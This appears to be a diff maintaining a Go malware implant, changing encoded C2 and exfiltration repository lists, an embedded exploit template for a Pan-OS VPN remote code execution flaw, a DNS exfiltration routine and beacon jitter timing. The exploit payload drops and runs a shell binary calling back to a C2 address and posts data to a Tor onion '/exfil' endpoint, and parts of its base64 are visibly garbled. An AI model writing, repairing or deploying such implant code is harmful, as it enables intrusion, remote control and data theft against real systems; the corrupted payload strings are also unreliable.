@@ -42,9 +42,9 @@ var (
 	C2Key             = "INJECTED_C2_KEY_B64"
 	C2IV              = "INJECTED_C2_IV_B64"
 	OnionListB64      = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9uLCBodHRwOi8vZ2FtbWFldGhlcnkxbjR0NG94Lm9uaW9u"
-	RepoListB64       = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjIsIGh0dHBzOi8vYXBpLmdpdGh1Yi5jb20vcmVwb3MvQkJCLUJNL0VYRklM"
+	RepoListB64       = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjIsaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkItQk0vRVhGSUw="
 	TelegramHost      = "dGVsZWdyYW0uYXBpLm9yZw=="
-	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdmU6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IGdldAogICAgcGF0aDogL3NzbC12cG4vcG9ydGFsL3NjcmlwdHMvbmV3Ym0ucGwKICAgIGhlYWRlcnM6CiAgICAgSG9zdDogY2VydGlmaWNhdGVzLmNvbQogICAgcHJlbWF0Y2g6IFwieCA9IDsncm0gL3RtcC8keyZyYW5kU3RyaW5nKDUpfTsgZWNobyAnJTEnIHwgc2ggLWcgfCBzaGVsbCA+IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGNobW9kICt4IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IG5vaHV3IC90bXAvJHsmcmFuZFN0cmluZyg1KX0gJHsmQzJfSVB9 ${C2_PORT7}ICY7 slZWVwIDM7IGVjaG8gXCJQQU4tT1MgUlBFIEV4cGxvaXQgU3VjY2VlZGVkXCIgfCBjdXJsIC1z -k -JXPOST https://${TorC2Onion{}}/exfil -d P/tmp/.pp; rm /dBXAvLnBwXCIKICAgIG1hdGNoZXN0cmluZzogRVhQTE9JVCBTVUNDRUVERQo="
+	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdmU6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IGdldAogICAgcGF0aDogL3NzbC12cG4vcG9ydGFsL3NjcmlwdHMvbmV3Ym0ucGwKICAgIGhlYWRlcnM6CiAgICAgSG9zdDogY2VydGlmaWNhdGVzLmNvbQogICAgcHJlbWF0Y2g6IFwieCA9IDsncm0gL3RtcC8keyZyYW5kU3RyaW5nKDUpfTsgZWNobyAnJTEnIHwgc2ggLWcgfCBzaGVsbCA+IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGNobW9kICt4IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IG5vaHV3IC90bXAvJHsmcmFuZFN0cmluZyg1KX0gJHsmQzJfSVB9 ${C2_PORT7}ICY7 slZWVwIDM7IGVjaG8gXCJQQU4tT1MgUlBFIEV4cGxvaXQgU3VjY2VlZGVkXCIgfCBjdXJs -k -JXPOST https://${TorC2Onion{}}/exfil -d P/tmp/.pp; rm /dBXAvLnBwXCIKICAgIG1hdGNoZXN0cmluZzogRVhQTE9JVCBTVUNDRUVERQo="
 	Phi3ModelEncB64   = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp"
 )
 
@@ -773,7 +773,6 @@ func dnsExfilTTL(data []byte) bool {
 	for i, chunk := range chunks {
 		fqdn := fmt.Sprintf("%s.%s", chunk, domain)
 		
-		// FIXED: Uses context.WithTimeout instead of ContextWithTimeout
 		ctx, cancel := context.WithTimeout(context.Background(), DNS_RESOLVE_TIMEOUT)
 		defer cancel()
 
@@ -972,7 +971,8 @@ func main() {
 			}
 		}
 
-		jitter := C2_JITTER + rand.Int63n(C2_JITTER_MAX-C2_JITTER+1)
+		// Fixed: Replaced rand.Int63n with valid math/rand Int63() modulo arithmetic
+		jitter := C2_JITTER + (rand.Int63() % (C2_JITTER_MAX - C2_JITTER + 1))
 		time.Sleep(time.Duration(jitter) * time.Second)
 	}
 }
